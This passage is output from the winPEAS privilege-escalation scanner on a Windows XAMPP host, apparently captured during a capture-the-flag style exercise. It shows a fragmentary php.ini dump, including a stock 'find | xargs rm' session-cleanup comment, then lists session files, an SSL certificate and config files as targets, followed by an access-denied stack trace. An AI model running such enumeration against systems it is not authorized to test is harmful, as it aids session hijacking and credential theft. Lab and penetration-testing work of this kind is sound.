; cleaned up by the garbage collection process.

; https://php.net/session.gc-maxlifetime

session.gc_maxlifetime=1440

; NOTE: If you are using the subdirectory option for storing session files

;       (see session.save_path above), then garbage collection does *not*

;       collection through a shell script, cron entry, or some other method.

;       session.gc_maxlifetime to 1440 (1440 seconds = 24 minutes):

;          find /path/to/sessions -cmin +24 -type f | xargs rm

; Check HTTP Referer to invalidate externally stored URLs containing ids.

; HTTP_REFERER has to contain this substring for the session to be

; considered as valid.

; https://php.net/session.referer-check

session.referer_check=

; https://php.net/session.cache-limiter

session.cache_limiter=nocache

; https://php.net/session.cache-expire

session.cache_expire=180

; Use this option with caution.

; - User may send URL contains active session ID

;   to other person via. email/irc/etc.

; - URL that contains active session ID may be stored

; - User may access your site with the same session ID

; https://php.net/session.use-trans-sid

session.use_trans_sid=0

; Set session ID character length. This value could be between 22 to 256.

; Shorter length than default is supported only for compatibility reason.

; https://php.net/session.sid-length

; Production Value: 26

session.sid_length=26

; to URLs. <form> tag's action attribute URL will not be modified

; Production Value: "a=href,area=href,frame=src,form="

session.trans_sid_tags="a=href,area=href,frame=src,form="

; <form> tags is special. PHP will check action attribute's URL regardless

; of session.trans_sid_tags setting.

; Production Value: ""

;session.trans_sid_hosts=""

; Define how many bits are stored in each character when converting

; Production Value: 5

; https://php.net/session.hash-bits-per-character

session.sid_bits_per_character=5

; Enable upload progress tracking in $_SESSION

; Default Value: On

; Development Value: On

; Production Value: On

; https://php.net/session.upload-progress.enabled

;session.upload_progress.enabled = On

; Cleanup the progress information as soon as all POST data has been read

; Default Value: On

; Development Value: On

; Production Value: On

; https://php.net/session.upload-progress.cleanup

;session.upload_progress.cleanup = On

; A prefix used for the upload progress key in $_SESSION

; Production Value: "upload_progress_"

; https://php.net/session.upload-progress.prefix

;session.upload_progress.prefix = "upload_progress_"

; The index name (concatenated with the prefix) in $_SESSION

; containing the upload progress information

; Default Value: "PHP_SESSION_UPLOAD_PROGRESS"

; Development Value: "PHP_SESSION_UPLOAD_PROGRESS"

; Production Value: "PHP_SESSION_UPLOAD_PROGRESS"

; https://php.net/session.upload-progress.name

;session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"

; Production Value: "1%"

; https://php.net/session.upload-progress.freq

;session.upload_progress.freq =  "1%"

; The minimum delay between updates, in seconds

; Production Value: 1

; https://php.net/session.upload-progress.min-freq

;session.upload_progress.min_freq = "1"

; Only write session data when session data is changed. Enabled by default.

; https://php.net/session.lazy-write

;session.lazy_write = On

[Assertion]

; Switch whether to compile assertions at all (to have no overhead at run-time)

;  0: Jump over assertion at run-time

;  1: Execute assertions

; Changing from or to a negative value is only possible in php.ini! (For turning assertions on and off at run-time, see assert.active, when zend.assertions = 1)

; Production Value: -1

; https://php.net/zend.assertions

zend.assertions=1

;assert.active = On

; Throw an AssertionError on failed assertions

; https://php.net/assert.exception

;assert.exception = On

; Issue a PHP warning for each failed assertion. (Overridden by assert.exception if active)

;assert.warning = On

; Don't bail out by default.

; User-function to be called if an assertion fails.

; path to a file containing GUIDs, IIDs or filenames of files with TypeLibs

; autoregister constants of a component's typelib on com_load()

; register constants casesensitive

; show warnings on duplicate constant registrations

; The version of the .NET framework to use. The value of the setting are the first three parts

; of the framework's version number, separated by dots, and prefixed with "v", e.g. "v4.0.30319".

;com.dotnet_version=

; language for internal character representation.

; If empty, default_charset or internal_encoding or iconv.internal_encoding is used.

; The precedence is: default_charset < internal_encoding < iconv.internal_encoding

; mbstring.encoding_translation = On is needed to use this setting.

; mb_output_handler must be registered as output buffer to function.

; To use an output encoding conversion, mbstring's output handler must be set

; otherwise output encoding conversion cannot be performed.

; enable automatic encoding translation according to

; converted to internal encoding by setting this to On.

; Note: Do _not_ use automatic encoding translation for

;       portable libs/applications.

; https://php.net/mbstring.encoding-translation

;mbstring.encoding_translation = Off

; automatic encoding detection order.

; substitute_character used when character cannot be converted

; one from another

;mbstring.substitute_character = none

; Enable strict encoding detection.

;mbstring.strict_detection = Off

; This directive specifies the regex pattern of content types for which mb_output_handler()

; Default: mbstring.http_output_conv_mimetypes=^(text/|application/xhtml\+xml)

;mbstring.http_output_conv_mimetypes=

; This directive specifies maximum stack depth for mbstring regular expressions. It is similar

; to the pcre.recursion_limit for PCRE.

; This directive specifies maximum retry count for mbstring regular expressions. It is similar

; With mbstring support this will automatically be converted into the encoding

; given by corresponding encode setting. When empty mbstring.internal_encoding

; The path to a default tidy configuration file to use when using tidy

; https://php.net/tidy.default-config

;tidy.default_config = /usr/local/lib/php/default.tcfg

; WARNING: Do not use this option if you are generating non-html content

; Sets the directory name where SOAP extension will put cache files.

; (time to live) Sets the number of second while cached file will be used

; instead of original one.

; Determines if Zend OPCache is enabled for the CLI version of PHP

;opcache.memory_consumption=128

; Only numbers between 200 and 1000000 are allowed.

; directory to the script key, thus eliminating possible collisions between

; performance, but may break existing applications.

; How often (in seconds) to check file timestamps for changes to the shared

; memory storage allocation. ("1" means validate once per second, but only

; once per request. "0" means always validate)

; Enables or disables file search in include_path optimization

; If enabled, compilation warnings (including notices and deprecations) will

; be recorded and replayed each time a file is included. Otherwise, compilation

; warnings will only be emitted when the file is first cached.

;opcache.optimization_level=0x7FFFBFFF

; The location of the OPcache blacklist file (wildcards allowed).

; Allows exclusion of large files from being cached. By default all files

;opcache.consistency_checks=0

; How long to wait (in seconds) for a scheduled restart to begin if the cache

; By default, only fatal errors (level 0) or errors (level 1) are logged.

; Protect the shared memory from unexpected writing during script execution.

; Useful for internal debugging only.

; Allows calling OPcache API functions only from PHP scripts which path is

; started from specified string. The default "" means no restriction

; Mapping base of shared memory segments (for Windows only). All the PHP

; Facilitates multiple OPcache instances per user (for Windows only). All PHP

; Enables and sets the second level cache directory.

;opcache.file_cache_only=0

; Enables or disables checksum validation when script loaded from file cache.

;opcache.file_cache_consistency_checks=1

; Implies opcache.file_cache_only=1 for a certain process that failed to

; reattach to the shared memory (for Windows only). Explicitly enabled file

; Under certain circumstances (if only a single global PHP process is

; by a tiny amount because TLB misses are reduced.  On the other hand, this

; Requires appropriate OS configuration.

; Validate cached file permissions.

;opcache.validate_permission=0

; Prevent name collisions in chroot'ed environment.

; optimizations.

; Preloading code as root is not allowed for security reasons. This directive

; Prevents caching files that are less than this number of seconds old. It

; on your site are atomic, you may increase performance by setting it to "0".

;opcache.file_update_protection=2

; Absolute path used to store shared lockfiles (for *nix only).

; A default value for the CURLOPT_CAINFO option. This is required to be an

; The location of a Certificate Authority (CA) file on the local filesystem

; be overridden on a per-stream basis via the "cafile" SSL stream context

; option.

; this value may still be overridden on a per-stream basis via the "capath"

; SSL stream context option.

; FFI API restriction. Possible values:

[Session]

date.timezone=Europe/Berlin

mysql.allow_local_infile=On

mysql.allow_persistent=On

mysql.connect_timeout=3

sybct.allow_persistent=On

mssql.allow_persistent=On

mssql.secure_connection=Off


ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP Sessions Files
File: C:\xampp\tmp\sess_rq099fhfvv979q08v5e70l7fr8
File: C:\xampp\tmp\sess_ros73nv5clk0pf2og8eo6v1c0d
File: C:\xampp\tmp\sess_pohfpcvm6t3c8loqfvhdbf66as
File: C:\xampp\tmp\sess_lvhngrg9bl04m63616suqdstva
File: C:\xampp\tmp\sess_kptskn1a1u98rji32cap1aps6c
File: C:\xampp\tmp\sess_imj8o33f721qsvp8fnbh5r7rij
File: C:\xampp\tmp\sess_gp8ujc5nl1mpvsrq5lb9step4f
File: C:\xampp\tmp\sess_f8lub5075g8gejferlech9o9ua
File: C:\xampp\tmp\sess_ebrf8ihq6g161bv5tkechnh181
File: C:\xampp\tmp\sess_9hkmk5gjubt2pckkiv0hvi8r82
File: C:\xampp\tmp\sess_0rnreuvfpctlcg9rp71chqk2a0

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP_files Files
File: C:\xampp\php\scripts\configure.php
File: C:\xampp\php\pear\PHPUnit\Util\Configuration.php
File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php
File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php
File: C:\xampp\php\pear\PEAR\Config.php
File: C:\xampp\php\pear\PEAR\Command\Config.php
File: C:\xampp\php\pear\Table\Storage.php

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Moodle Files
File: C:\xampp\php\pear\PEAR\Config.php
File: C:\xampp\php\pear\PEAR\Command\Config.php

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found CERTSB4 Files
File: C:\xampp\apache\conf\ssl.crt
Error looking for regexes inside files: System.AggregateException: One or more errors occurred. ---> System.UnauthorizedAccessException: Access to the path 'C:\Users\All Users\checkmk\agent\check_mk.user.yml' is denied.           
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)                                          
   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)                                                                        
   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)                   
   at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize, Boolean checkHost)                                                                                     
   at System.IO.File.InternalReadAllText(String path, Encoding encoding, Boolean checkHost)                        
   at winPEAS.Checks.FileAnalysis.<>c__DisplayClass6_2.<PrintYAMLRegexesSearchFiles>b__4(CustomFileInfo f)         
   at System.Threading.Tasks.Parallel.<>c__DisplayClass17_0`1.<ForWorker>b__1()                                    
   at System.Threading.Tasks.Task.InnerInvokeWithArg(Task childTask)                                               
   at System.Threading.Tasks.Task.<>c__DisplayClass176_0.<ExecuteSelfReplicating>b__0(Object <p0>)                 
   --- End of inner exception stack trace ---                                                                      
   at System.Threading.Tasks.Task.ThrowIfExceptional(Boolean includeTaskCanceledExceptions)                        
   at System.Threading.Tasks.Task.Wait(Int32 millisecondsTimeout, CancellationToken cancellationToken)             
   at System.Threading.Tasks.Parallel.ForWorker[TLocal](Int32 fromInclusive, Int32 toExclusive, ParallelOptions parallelOptions, Action`1 body, Action`2 bodyWithState, Func`4 bodyWithLocal, Func`1 localInit, Action`1 localFinally)
   at System.Threading.Tasks.Parallel.ForEachWorker[TSource,TLocal](IEnumerable`1 source, ParallelOptions parallelOptions, Action`1 body, Action`2 bodyWithState, Action`3 bodyWithStateAndIndex, Func`4 bodyWithStateAndLocal, Func`5 bodyWithEverything, Func`1 localInit, Action`1 localFinally)                                                      
   at System.Threading.Tasks.Parallel.ForEach[TSource](IEnumerable`1 source, ParallelOptions parallelOptions, Action`1 body)                                                                                                          
   at winPEAS.Checks.FileAnalysis.<>c__DisplayClass6_2.<PrintYAMLRegexesSearchFiles>b__3()                         
   at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)                          
   at winPEAS.Checks.FileAnalysis.PrintYAMLRegexesSearchFiles()                                                    
---> (Inner Exception #0) System.UnauthorizedAccessException: Access to the path 'C:\Users\All Users\checkmk\agent\check_mk.user.yml' is denied.                                                                                      
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)                                          
   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)                                                                        
   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)                   
   at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize, Boolean checkHost)                                                                                     
   at System.IO.File.InternalReadAllText(String path, Encoding encoding, Boolean checkHost)                        
   at winPEAS.Checks.FileAnalysis.<>c__DisplayClass6_2.<PrintYAMLRegexesSearchFiles>b__4(CustomFileInfo f)         
   at System.Threading.Tasks.Parallel.<>c__DisplayClass17_0`1.<ForWorker>b__1()                                    
   at System.Threading.Tasks.Task.InnerInvokeWithArg(Task childTask)                                               
   at System.Threading.Tasks.Task.<>c__DisplayClass176_0.<ExecuteSelfReplicating>b__0(Object <p0>)<---             
                                                                                                                   

       /---------------------------------------------------------------------------------\                         
       |                             Do you like PEASS?                                  |                         
       |---------------------------------------------------------------------------------|                         
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                         
       |         Follow on Twitter         :     @carlospolopm                           |                         
       |         Respect on HTB            :     SirBroccoli                             |                         
       |---------------------------------------------------------------------------------|                         
       |                                 Thank you!                                      |                         
       \---------------------------------------------------------------------------------/                         
                                                                                                                   
PS C:\Users\monitoring_svc\Downloads> 
```